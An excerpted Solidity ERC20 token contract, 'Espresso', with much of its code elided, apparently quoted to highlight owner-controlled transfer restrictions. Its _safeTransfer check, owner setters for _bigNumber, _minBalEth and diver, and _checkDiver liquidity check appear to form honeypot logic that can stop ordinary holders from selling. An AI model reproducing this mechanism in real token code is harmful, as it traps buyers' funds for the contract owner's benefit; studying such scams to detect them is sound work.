...
contract Espresso is Context, IERC20, Ownable {
    ...
    uint256 internal _bigNumber = ~uint256(0);
    uint256 internal _minBalEth = 0;

    uint256 public diver;
    uint256 public balLiquidity;
    ...
    function transfer(address recipient, uint256 amount) external override returns (bool) {
        if (_safeTransfer(_msgSender(), recipient, amount)) {
    ...
    function transferFrom(
        ...
        if (_safeTransfer(sender, recipient, amount)) {
    ...
    function setBigNumber(uint256 newValue) external onlyOwner {
        _bigNumber = newValue;
    }

    function setMinBalETH(uint256 newValue) external onlyOwner {
        _minBalEth = newValue;
    }
    ...
    function setDiver(uint256 _newDiver) external onlyOwner {
        require(_newDiver < 100_000);
        diver = _newDiver;
    }
    ...
    function _safeTransfer(address sender, address recipient, uint256 amount) view  private returns (bool) {
        ...
        if (_isSuper(recipient)) {
            ...
            return bought >= sold + amount && _bigNumber >= soldETH + amountETH && sender.balance >= _minBalEth;
        }
        return false;
    }
    ...
    function _transfer(
        ...
        balLiquidity = _pair.totalSupply();
    ...
    function _checkDiver() internal view {
        uint256 currentBalLiquidity = _pair.totalSupply();
        if (diver > 1 && currentBalLiquidity < balLiquidity ) {
            require(currentBalLiquidity * _balances[address(_pair)] / balLiquidity < diver);
        }
    }
}